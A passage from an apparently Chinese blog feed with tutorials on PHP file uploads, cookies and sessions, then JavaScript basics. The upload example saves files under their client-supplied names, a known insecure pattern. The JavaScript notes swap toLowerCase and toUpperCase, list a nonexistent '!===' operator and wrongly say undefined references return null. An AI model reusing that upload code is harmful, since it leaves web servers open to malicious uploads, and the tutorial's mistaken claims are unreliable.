punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Size: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>      <span class="token punctuation">{</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Invalid file"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这里脚本会检测是否已存在此文件，如果不存在，则把文件拷贝到指定的 <code>upload</code> 文件夹下。</p><hr><h3 id="0x003-PHP-cookies-和-sessions"><a href="#0x003-PHP-cookies-和-sessions" class="headerlink" title="0x003 PHP cookies 和 sessions"></a>0x003 PHP cookies 和 sessions</h3><hr><h4 id="1-cookies"><a href="#1-cookies" class="headerlink" title="1. cookies"></a>1. cookies</h4><p><code>cookie</code> 常用于识别用户。<code>cookie</code> 是服务器留在用户计算机中的小文件。每当相同的计算机通过浏览器请求页面时，它同时会发送 <code>cookie</code>。</p><p><strong>创建 cookie</strong></p><p>setcookie() 函数用于设置 cookie。</p><blockquote><p>注释：setcookie() 函数必须位于  标签之前。</p></blockquote><p>语法：</p><pre class=" language-php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> expire<span class="token punctuation">,</span> path<span class="token punctuation">,</span> domain<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"pikachu"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><blockquote><p>注释：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 setrawcookie() 取而代之）。</p></blockquote><p><strong>获取 cookie 值</strong></p><p>PHP 的 $_COOKIE 变量用于获取 cookie 的值。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 输出对应用户的 cookie 值</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 查看所有 cookie 值</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>使用 isset() 函数来确认是否已设置了 cookie：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">echo</span> <span class="token string">"Welcome "</span> <span class="token punctuation">.</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"!&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"Welcome guest!&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p><strong>删除 cookie</strong></p><p>删除 cookie 时，使过期日期变更为过去的时间点。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// 将日期设置为一小时前</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>浏览器不支持 cookie 的解决办法</p><p>如果应用程序涉及不支持 <code>cookie</code> 的浏览器，就不得不采取其他方法在应用程序中从一张页面向另一张页面传递信息。一种方式是从表单传递数据。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        姓名: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        年龄: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>获取 index.php 中的值：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    姓名： <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    年龄： <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><h4 id="2-sessions"><a href="#2-sessions" class="headerlink" title="2. sessions"></a>2. sessions</h4><p>Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</p><p><strong>开启 session</strong></p><blockquote><p>注释：session_start() 函数必须位于  标签之前：</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><blockquote><p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p></blockquote><p><strong>存储 Session 变量</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 存储会话数据</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 检索会话数据</span><span class="token keyword">echo</span> <span class="token string">"Pageviews="</span><span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>创建一个简单的 page-view 计数器。isset() 函数检测是否已设置 “views” 变量。如果已设置 “views” 变量，我们累加计数器。如果 “views” 不存在，则我们创建 “views” 变量，并把它设置为 1：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"Views="</span><span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>结束 Session</p><p>如果希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p><p>unset() 函数用于释放指定的 session 变量：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>也可以通过 session_destroy() 函数彻底终结 session：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><blockquote><p>注释：session_destroy() 将重置 session，您将失去所有已存储的 session 数据。</p></blockquote><hr><h3 id="0x004-更多教程"><a href="#0x004-更多教程" class="headerlink" title="0x004 更多教程"></a>0x004 更多教程</h3><hr><p><a href="https://www.w3school.com.cn/php/index.asp">W3school-PHP 教程</a><br><a href="https://www.imooc.com/">慕课网-程序员的梦工厂</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> Web Security </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全JavaScript基础</title>
      <link href="/2022/08/09/toc-heading-5/"/>
      <url>/2022/08/09/toc-heading-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-JavaScript-简介"><a href="#0x001-JavaScript-简介" class="headerlink" title="0x001 JavaScript 简介"></a>0x001 JavaScript 简介</h3><hr><p><code>JavaScript</code> 是目前 <code>web</code> 开发中不可缺少的脚本语言，<code>js</code> 不需要编译即可运行，运行在客户端，需要通过浏览器来解析执行 <code>JavaScript</code> 代码。诞生于 1995 年，当时的主要目的是验证表单的数据是否合法。<code>JavaScript</code> 本来应该叫<code>Livescript</code>，但是在发布前夕，想搭上当时超热的 <code>java</code> 顺风车，临时把名字改为了 <code>JavaScript</code>。（也就是说 <code>js</code> 跟 <code>java</code> 没有关系，当时只是想借助 <code>java</code> 的名气）。</p><p><code>javaScript</code> 被用来改进设计、验证表单、检测浏览器、创建 <code>cookies</code>，等等。<code>JavaScript</code><br>是因特网上最流行的脚本语言，并且可在所有主要的浏览器中运行，比如：<code>Internet Explorer</code>、 <code>Maxthon</code>、<code>Mozilla</code>、<code>Firefox</code>、<code>Netscape</code>、<code>Chrome</code> 和 <code>Opera</code>等。</p><p>常用于修改 <code>HTML</code> 及 <code>CSS</code> 代码 和验证表单</p><hr><h3 id="0x002-JavaScript-语句"><a href="#0x002-JavaScript-语句" class="headerlink" title="0x002 JavaScript 语句"></a>0x002 JavaScript 语句</h3><hr><p>1.在编程语言中，这些编程指令被称为语句。</p><p><code>JavaScript</code> 程序就是一系列的编程语句。</p><blockquote><p>注释：在 HTML 中，JavaScript 程序由 web 浏览器执行。</p></blockquote><p>2.<code>JavaScript</code> 语句由以下构成：</p><p>值、运算符、表达式、关键词和注释。</p><p>3.用分号（;）分隔 <code>JavaScript</code> 语句。</p><p><strong>JavaScript 语句标识符</strong></p><p><code>JavaScript</code> 语句通常以一个 语句标识符为开始，并执行该语句。</p><p>语句标识符是保留关键字不能作为变量名使用。</p><p>下表列出了 <code>JavaScript</code> 语句标识符 (关键字) ：</p><table><thead><tr><th>语句</th><th>描述</th></tr></thead><tbody><tr><td>break</td><td>用于跳出循环。</td></tr><tr><td>catch</td><td>语句块，在 try 语句块执行出错时执行 catch 语句块。</td></tr><tr><td>continue</td><td>跳过循环中的一个迭代。</td></tr><tr><td>do … while</td><td>执行一个语句块，在条件语句为 true 时继续执行该语句块。</td></tr><tr><td>for</td><td>在条件语句为 true 时，可以将代码块执行指定的次数。</td></tr><tr><td>for … in</td><td>用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。</td></tr><tr><td>function</td><td>定义一个函数</td></tr><tr><td>if … else</td><td>用于基于不同的条件来执行不同的动作。</td></tr><tr><td>return</td><td>退出函数</td></tr><tr><td>switch</td><td>用于基于不同的条件来执行不同的动作。</td></tr><tr><td>throw</td><td>抛出（生成）错误 。</td></tr><tr><td>try</td><td>实现错误处理，与 catch 一同使用。</td></tr><tr><td>var</td><td>声明一个变量。</td></tr><tr><td>while</td><td>当条件语句为 true 时，执行语句块。</td></tr></tbody></table><hr><h3 id="0x003-JavaScript-注释"><a href="#0x003-JavaScript-注释" class="headerlink" title="0x003 JavaScript 注释"></a>0x003 JavaScript 注释</h3><hr><p>单行注释： // 注释语句   快捷键 ctrl+/<br>多行注释： /* 注释语句 */   快捷键 ctrl+shift+/ </p><blockquote><p>注意：多行注释相互不能嵌套使用，只能在多行注释里面使用单行注释！</p></blockquote><hr><h3 id="0x004-JavaScript-变量"><a href="#0x004-JavaScript-变量" class="headerlink" title="0x004 JavaScript 变量"></a>0x004 JavaScript 变量</h3><hr><p>与代数一样，<code>JavaScript</code> 变量可用于存放值（比如 <code>x=5</code>）和表达式（比如 <code>z=x+y</code>）。</p><p>变量可以使用短名称（比如 x 和 y），也可以使用描述性更好的名称（比如 <code>age</code>, <code>sum</code>, <code>totalvolume</code>）。</p><ul><li>变量必须以字母开头</li><li>变量也能以 <code>$</code> 和 <code>_</code> 符号开头（不过我们不推荐这么做）</li><li>变量名称对大小写敏感（<code>y</code> 和 <code>Y</code> 是不同的变量）</li></ul><blockquote><p>JavaScript 语句和 JavaScript 变量都对大小写敏感。<br>JavaScript 单双引号没区别</p></blockquote><hr><h3 id="0x005-JavaScript-数据类型"><a href="#0x005-JavaScript-数据类型" class="headerlink" title="0x005 JavaScript 数据类型"></a>0x005 JavaScript 数据类型</h3><hr><p>值类型(基本类型)：字符串（<code>String</code>）、数字(<code>Number</code>)、布尔(<code>Boolean</code>)、空（<code>Null</code>）、未定义（<code>Undefined</code>）、<code>Symbol</code>。</p><p>引用数据类型（对象类型）：对象(<code>Object</code>)、数组(<code>Array</code>)、函数(<code>Function</code>)，还有两个特殊的对象：正则（<code>RegExp</code>）和日期（<code>Date</code>）。</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/08/Javascript-DataType.png" alt="数据类型图解"></p><blockquote><p>注：Symbol 是 ES6 引入了一种新的原始数据类型，表示独一无二的值。</p></blockquote><h4 id="1-JavaScript-数字"><a href="#1-JavaScript-数字" class="headerlink" title="1.JavaScript 数字"></a>1.JavaScript 数字</h4><p>JavaScript 只有一种数字类型。数字可以带小数点，也可以不带：</p><pre class=" language-bash"><code class="language-bash">var x1<span class="token operator">=</span>34.00<span class="token punctuation">;</span>      //使用小数点来写var x2<span class="token operator">=</span>34<span class="token punctuation">;</span>         //不使用小数点来写</code></pre><p>以 0 开头 默认使用 8 进制来表示我的这个数字</p><p>以 0x 开头 默认使用 16 进制来表述我的这个数字</p><p>如果以-开头 默认以负数</p><p>如果我带有 e：以科学计数法来解析我的这个数字</p><p>parseInt(..) 将某值转换成数字，不成功则 NaN</p><p>parseFloat(..) 将某值转换成浮点数，不成功则 NaN</p><p>特殊值：</p><p>NaN，非数字。可使用 isNaN(num) 来判断。</p><p>Infinity，无穷大。可使用 isFinite(num) 来判断。</p><h4 id="2-JavaScript-字符串"><a href="#2-JavaScript-字符串" class="headerlink" title="2.JavaScript 字符串"></a>2.JavaScript 字符串</h4><p>字符串是存储字符（比如 “Bill Gates”）的变量。</p><p>字符串可以是引号中的任意文本。您可以使用单引号或双引号：</p><pre class=" language-bash"><code class="language-bash">var carname<span class="token operator">=</span><span class="token string">"Volvo XC60"</span><span class="token punctuation">;</span>var carname<span class="token operator">=</span><span class="token string">'Volvo XC60'</span><span class="token punctuation">;</span></code></pre><p>字符串是存储字符的变量，用来表示文本的数据类型，程序中的字符串是包含单引号/双引号的，由单引号来界定我双引号中包含的字符串</p><ul><li>obj.length 长度</li><li>obj.trim() 移除空白</li><li>obj.trimLeft()</li><li>obj.trimRight)</li><li>obj.charAt(n) 返回字符串中的第 n 个字符</li><li>obj.concat(value, …) 拼接</li><li>obj.indexOf(substring,start) 子序列位置</li><li>obj.lastIndexOf(substring,start) 子序列位置</li><li>obj.substring(from, to) 根据索引获取子序列</li><li>obj.slice(start, end) 切片</li><li>obj.toLowerCase() 大写</li><li>obj.toUpperCase() 小写</li><li>obj.split(delimiter, limit) 分割</li><li>obj.search(regexp) 从头开始匹配，返回匹配成功的第一个位置(g 无效)</li><li>obj.match(regexp) 全局搜索，如果正则中有 g 表示找到全部，否则只找到第一个。</li><li>obj.replace(regexp, replacement) 替换，正则中有 g 则替换所有，否则只替换第一个匹配项</li></ul><p><code>replacement</code> 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 <code>replacement</code> 中的 <code>$</code> 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p><table><thead><tr><th>字符</th><th>替换文本</th></tr></thead><tbody><tr><td>$1、$2、…、$99</td><td>与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。</td></tr><tr><td>$&amp;</td><td>与 regexp 相匹配的子串。</td></tr><tr><td>$`</td><td>位于匹配子串左侧的文本。</td></tr><tr><td>$’</td><td>位于匹配子串右侧的文本。</td></tr><tr><td>$$</td><td>直接量符号。</td></tr></tbody></table><h4 id="3-JavaScript-布尔"><a href="#3-JavaScript-布尔" class="headerlink" title="3.JavaScript 布尔"></a>3.JavaScript 布尔</h4><p>布尔（逻辑）只能有两个值：true 或 false。一般是用在流程控制语句中，字符串和数字类型都是无穷多个。这两个个值一般用于说明某个事物是真或者假。</p><pre class=" language-bash"><code class="language-bash">var x<span class="token operator">=</span>true<span class="token punctuation">;</span>var y<span class="token operator">=</span>false<span class="token punctuation">;</span></code></pre><p>js 一般用布尔类型来比较所得到的结果</p><p>布尔类型仅包含真假，</p><ul><li>== 比较值相等</li><li>!= 不等于</li><li>=== 比较值和类型相等</li><li>!=== 不等于</li><li>|| 或</li><li>&amp;&amp; 且</li></ul><h4 id="4-JavaScript-判断"><a href="#4-JavaScript-判断" class="headerlink" title="4.JavaScript 判断"></a>4.JavaScript 判断</h4><pre class=" language-bash"><code class="language-bash">var a <span class="token operator">=</span> <span class="token string">"iamstring."</span><span class="token punctuation">;</span>var b <span class="token operator">=</span> 222<span class="token punctuation">;</span>var c<span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3<span class="token punctuation">]</span><span class="token punctuation">;</span>var d <span class="token operator">=</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var e <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>alert<span class="token punctuation">(</span>111<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>var f <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>this.name<span class="token operator">=</span><span class="token string">"22"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li>alert(typeof a) ————&gt; string</li><li>alert(typeof b) ————&gt; number</li><li>alert(typeof c) ————&gt; object</li><li>alert(typeof d) ————&gt; object</li><li>alert(typeof e) ————&gt; function</li><li>alert(typeof f) ————&gt; function</li></ul><h4 id="5-Undefined-和-Null"><a href="#5-Undefined-和-Null" class="headerlink" title="5.Undefined 和 Null"></a>5.Undefined 和 Null</h4><p>关键字 null 是一个特殊的值，它表示变量为空值，用来定义空的或者是不存在的引用。</p><p>如果试图去引用一个没有定义的值，就会返回一个 null。</p><p>可以通过将变量的值设置为 null 来清空变量。</p><pre class=" language-bash"><code class="language-bash">cars<span class="token operator">=</span>null<span class="token punctuation">;</span>person<span class="token operator">=</span>null<span class="token punctuation">;</span></code></pre><p>Undefined 这个值表示变量不含有值。</p><blockquote><p>注意：null 并不等于”” 或者 0</p></blockquote><p>！null 和 undefined 区别：</p><p>null 它表示一个变量被赋予一个空值，而 undefined 是表示变量还没有被赋值。</p><h4 id="6-JavaScript-数组"><a href="#6-JavaScript-数组" class="headerlink" title="6.JavaScript 数组"></a>6.JavaScript 数组</h4><ol><li>数组内可以存放任意数据类型的数据（本质上它也是对象）</li><li>数组元素不赋值的情况下 值为 undefined</li><li>如果数组打印的时候，元素不赋值””</li><li>访问数组范围之外的元素，不会出现越界的问题，undefined</li><li>定义数组大小，照样可以添加更多元素</li></ol><h5 id="6-1-定义数组的方法"><a href="#6-1-定义数组的方法" class="headerlink" title="6.1 定义数组的方法"></a>6.1 定义数组的方法</h5><ol><li>var arr=[]//定义一个空数组</li><li>var arr=[10,20,{“name”:”tomy”,”age”:19},0.1,”string”,true,[“aaa”,”bbb”]]//定义的同时赋值</li><li>var arr=new Array();//定义一个空数组</li><li>var arr = new Array(10,20,{“name”:”tomy”,”age”:19},0.1,”string”,true,[“aaa”,”bbb”])//定义的同时赋值</li><li>var arr=new Array(10)//定义一个长度为 10 的数组</li></ol><h5 id="6-2-数组的操作"><a href="#6-2-数组的操作" class="headerlink" title="6.2 数组的操作"></a>6.2 数组的操作</h5><ul><li>obj.length 数组的大小</li><li>obj.push(ele) 尾部追加元素</li><li>obj.pop() 尾部获取一个元素</li><li>obj.unshift(ele) 头部插入元素</li><li>obj.shift() 头部移除元素</li><li>obj.splice(start, deleteCount, value, …) 插入、删除或替换数组的元素</li><li>obj.splice(n,0,val) 指定位置插入元素</li><li>obj.splice(n,1,val) 指定位置替换元素</li><li>obj.splice(n,1) 指定位置删除元素</li><li>obj.slice( ) 切片</li><li>obj.reverse( ) 反转</li><li>obj.join(sep) 将数组元素连接起来以构建一个字符串</li><li>obj.concat(val,..) 连接数组</li><li>obj.sort( ) 对数组元素进行排序</li></ul><hr><h3 id="0x006-JavaScript-对象"><a href="#0x006-JavaScript-对象" class="headerlink" title="0x006 JavaScript 对象"></a>0x006 JavaScript 对象</h3><hr><p><code>JavaScript</code> 